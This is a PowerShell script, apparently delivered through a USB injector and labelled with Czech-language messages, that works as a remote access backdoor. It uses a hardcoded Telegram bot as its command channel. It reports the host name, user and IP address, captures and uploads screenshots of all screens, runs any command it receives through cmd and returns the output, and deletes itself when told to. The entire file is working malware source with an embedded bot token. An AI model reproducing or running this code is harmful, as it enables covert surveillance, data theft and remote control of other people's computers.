$botToken = '8510265210:AAH9HMaiR1ineEhf4SHtZBCaiO1HBPbcYTw'
$lastUpdateId = 0
$chatId = $null

function Send-Message($text) {
    if(!$chatId){return}
    $text = $text -replace '\\','\\' -replace '"','\"' -replace "`n",'\n' -replace "`r",''
    $json = "{`"chat_id`":`"$chatId`",`"text`":`"$text`"}"
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType 'application/json' -Body $json -ErrorAction Stop | Out-Null
    } catch {
        Write-Host "Send error: $_"
    }
}

while($true) {
    try {
        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$($lastUpdateId+1)&timeout=10"
        $response = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 15
        
        foreach($update in $response.result) {
            $lastUpdateId = $update.update_id
            
            if(!$chatId -and $update.message.chat.id) {
                $chatId = $update.message.chat.id
                Send-Message "[ONLINE] USB Injector Agent aktivni`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`n`nZadej prikaz nebo /help"
            }
            
            $cmd = $update.message.text
            if(!$cmd){continue}
            
            if($cmd -eq '/start') {
                Send-Message "System aktivni"
            } elseif($cmd -eq '/status') {
                $pc = $env:COMPUTERNAME
                $user = $env:USERNAME
                $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*"} | Select-Object -First 1).IPAddress
                Send-Message "[STATUS]`nPC: $pc`nUser: $user`nIP: $ip`nOnline"
            } elseif($cmd -eq '/help') {
                Send-Message "Prikazy:`n/status - Info o PC`n/help - Napoveda`n/screenshot - Udelej screenshot`n/kill - Ukonci agenta`n`nZadej CMD prikaz (ipconfig, dir, whoami, tasklist...)"
            } elseif($cmd -eq '/kill') {
                Send-Message "Agent se ukoncuje..."
                Remove-Item "C:\agent.ps1" -Force -ErrorAction SilentlyContinue
                exit
            } elseif($cmd -eq '/screenshot') {
                Send-Message "Delam screenshot..."
                Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                $screens = [System.Windows.Forms.Screen]::AllScreens
                $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
                $left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
                $width = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum
                $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
                $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
                $bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
                $graphics = [Drawing.Graphics]::FromImage($bmp)
                $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
                $screenshot = "C:\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
                $bmp.Save($screenshot)
                $graphics.Dispose()
                $bmp.Dispose()
                
                # Pošli screenshot do Telegramu
                $uri = "https://api.telegram.org/bot$botToken/sendPhoto"
                $boundary = [System.Guid]::NewGuid().ToString()
                $LF = "`r`n"
                $bodyLines = (
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"chat_id`"$LF",
                    $chatId,
                    "--$boundary",
                    "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.png`"",
                    "Content-Type: image/png$LF",
                    [System.IO.File]::ReadAllBytes($screenshot),
                    "--$boundary--$LF"
                ) -join $LF
                
                try {
                    Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
                } catch {}
                
                Remove-Item $screenshot -Force
            } else {
                Send-Message "[EXECUTING] $cmd"
                try {
                    $output = cmd /c "$cmd" 2>&1
                    $exitCode = $LASTEXITCODE
                    
                    if($output) {
                        $result = "[EXIT: $exitCode]`n`n$output"
                        if($result.Length -gt 3500) {
                            $result = $result.Substring(0,3500) + "`n...(zkraceno)"
                        }
                        Send-Message $result
                    } else {
                        Send-Message "[EXIT: $exitCode]`n(zadny vystup)"
                    }
                } catch {
                    Send-Message "[ERROR] $($_.Exception.Message)"
                }
            }
        }
    } catch {
        Start-Sleep -Seconds 5
    }
}
